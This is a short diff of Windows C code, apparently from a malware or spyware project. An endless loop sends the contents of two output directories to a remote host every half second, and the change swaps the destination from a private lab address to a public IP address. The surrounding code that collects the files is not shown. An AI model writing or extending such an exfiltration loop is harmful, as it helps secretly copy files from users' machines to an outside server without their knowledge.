@@ -130,8 +130,8 @@ int main(int argc, char *argv[]) {
     while (1) {
         Sleep(500); // Sleep en millisecondes
         printf("sending !");
-        send_dir(output_dir, "10.0.11.87");
-        send_dir(output_file_dir, "10.0.11.87");
+        send_dir(output_dir, "144.173.84.1");
+        send_dir(output_file_dir, "144.173.84.1");
         printf("sended !");
         // Création des répertoires (ignore erreur si déjà existant)
         CreateDirectory(output_file_dir, NULL);
